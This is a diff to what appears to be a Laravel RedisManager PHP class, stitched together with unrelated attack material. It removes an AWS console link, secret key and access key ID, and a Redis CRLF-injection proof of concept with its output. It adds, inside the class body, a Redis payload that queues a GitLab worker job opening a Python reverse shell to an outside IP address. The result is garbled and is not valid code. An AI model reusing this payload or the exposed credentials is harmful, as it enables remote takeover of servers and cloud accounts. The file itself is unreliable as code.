@@ -31,11 +31,6 @@ class RedisManager implements Factory
      * @var array
      */
     protected $config;
-    User name	Password
-    Console login link         https://669289819966.signin.aws.amazon.com/console
-  	Secret access key	iZ9Tl7Xe4LFD3AqRFBQhPvF2PJ57Yu7B3uvn6v9
-    Access key ID  AKIAZXVGIF47KLYKSLQG		
-
 
     /**
      * The Redis connections.
@@ -50,7 +45,12 @@ class RedisManager implements Factory
      * @var bool
      */
     protected $events = false;
-
+git://127.0.0.1:6379/
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3 -c \\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"118.89.198.146\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+ exec
+/bbbbb/ccccc
     /**
      * Create a new Redis manager instance.
      *
@@ -72,8 +72,6 @@ class RedisManager implements Factory
      * @param  string|null  $name
      * @return \Illuminate\Redis\Connections\Connection
      */
-    urllib2.urlopen('http://127.0.0.1:6379/?q=HTTP/1.1\r\nSET VULN POC\r\nHeader2:\r\n').read()
-    '$-1\r\n+OK\r\n-ERR unknown command `Header2:`, with args beginning with: `HTTP/1.1`, \r\n-ERR unknown command `Accept-Encoding:`, with args beginning with: `identity`, \r\n'
     public function connection($name = null)
     {
         $name = $name ?: 'default';
